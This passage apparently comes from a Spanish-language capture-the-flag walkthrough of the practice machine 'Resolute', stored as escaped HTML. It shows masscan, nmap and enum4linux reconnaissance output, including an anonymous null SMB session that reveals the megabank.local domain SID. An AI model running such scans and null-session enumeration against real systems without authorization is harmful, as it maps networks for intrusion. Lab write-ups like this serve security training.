Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-03 21:06:25 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 3269/tcp on 10.10.10.169                                  
Discovered open port 5985/tcp on 10.10.10.169                                  
Discovered open port 464/tcp on 10.10.10.169                                   
Discovered open port 65511/udp on 10.10.10.169                                 
Discovered open port 593/tcp on 10.10.10.169                                   
Discovered open port 49665/tcp on 10.10.10.169                                 
Discovered open port 3268/tcp on 10.10.10.169                                  
Discovered open port 49915/tcp on 10.10.10.169                                 
Discovered open port 389/tcp on 10.10.10.169                                   
Discovered open port 88/tcp on 10.10.10.169                                    
Discovered open port 49667/tcp on 10.10.10.169                                 
Discovered open port 56647/udp on 10.10.10.169                                 
Discovered open port 53/tcp on 10.10.10.169

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jan  3 15:11:12 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.169&lt;/span&gt;
Warning: 10.10.10.169 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.169
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;63791&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1719&lt;/span&gt; filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2020-01-03 21:24:08Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: megabank.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: MEGABANK&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: megabank.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  adws?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  unknown
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49915/tcp open  msrpc        Microsoft Windows RPC
52015/tcp open  tcpwrapped
52105/tcp open  tcpwrapped
Service Info: Host: RESOLUTE&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h48m08s, deviation: 4h37m09s, median: 8m07s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Resolute
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: RESOLUTE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Forest name: megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: Resolute.megabank.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2020-01-03T13:25:11-08:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-03T21:25:14
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2020-01-03T20:29:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jan  3 15:18:57 2020 -- 1 IP address (1 host up) scanned in 464.61 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;162
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;163
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;164
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;165
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;166
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;167
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;168
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;169
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;170
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;171
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;172
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;173
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;174
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;175
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;176
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;177
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;178
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;179
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;180
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;181
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;182
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;183
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;184
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;185
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;186
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;187
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;188
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;189
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;190
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;191
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;192
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;193
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;194
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;195
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;196
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;197
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;198
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;199
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;200
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;201
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;202
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;203
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;204
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;205
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;206
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;207
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;208
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;209
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;210
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;211
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;212
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;213
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;214
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;215
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;216
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;217
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;218
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;219
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;220
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;221
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;222
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;223
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;224
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;225
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;226
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;227
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;228
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;229
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;230
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;231
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;232
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;233
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;234
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;235
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;236
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;237
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;238
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;239
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;240
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;241
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;242
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;243
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;244
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;245
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;246
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;247
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;248
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;249
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;250
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;251
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;252
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;253
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;254
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;255
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;256
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;257
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;258
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;259
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;260
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;261
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;262
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;263
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;264
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;265
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;266
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;267
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;268
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;269
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;270
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;271
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.169    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Nbtstat Information for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Looking up status of 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;No reply from 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.169 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got domain/workgroup name: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Getting domain SID for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Name: MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Host is part of a domain (not a workgroup)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
